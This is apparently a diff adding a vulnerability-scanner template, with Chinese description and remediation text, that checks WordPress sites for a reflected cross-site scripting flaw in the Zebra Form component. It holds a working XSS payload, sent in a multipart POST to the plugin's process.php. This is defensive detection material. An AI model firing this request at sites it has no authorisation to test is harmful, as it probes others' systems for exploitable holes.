@@ -1,0 +1,44 @@
+id: wordpress-zebra-form-xss
+info:
+  name: Wordpress Zebra Form - Cross-Site Scripting
+  author:
+  - l0ne1y
+  description: |-
+    WordPress Plugin Zebra Form存在跨站脚本漏洞
+    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。Wordfence plugin是使用在其中的一个恶意软件扫描和防火墙插件。
+
+    WordPress plugin Zebra Form存在跨站脚本漏洞，该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。
+  severity: medium
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：http://wordpress.org/extend/plugins/
+
+    临时修复方案：
+    1、对输入(和URL参数)进行过滤，对输出进行编码，白名单和黑名单结合。也就是对提交的所有内容进行过滤，对url中的参数进行过滤，过滤掉会导致脚本执行的相关内容；然后对动态输出到页面的内容进行html编码，使脚本无法在浏览器中执行。虽然对输入过滤可以被绕过，但是也还是会拦截很大一部分的XSS攻击；最后对字符进行白名单或者黑名单限制。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - </script><img src onerror=alert(/XSS-form/)>
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: header
+    words:
+    - text/html
+  matchers-condition: and
+  raw:
+  - |
+    POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(/XSS-form/)%3E&control=upload HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
+    Origin: null
+
+    -----------------------------77916619616724262872902741074
+    Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
+    Content-Type: text/plain
+    Test
+    -----------------------------77916619616724262872902741074--
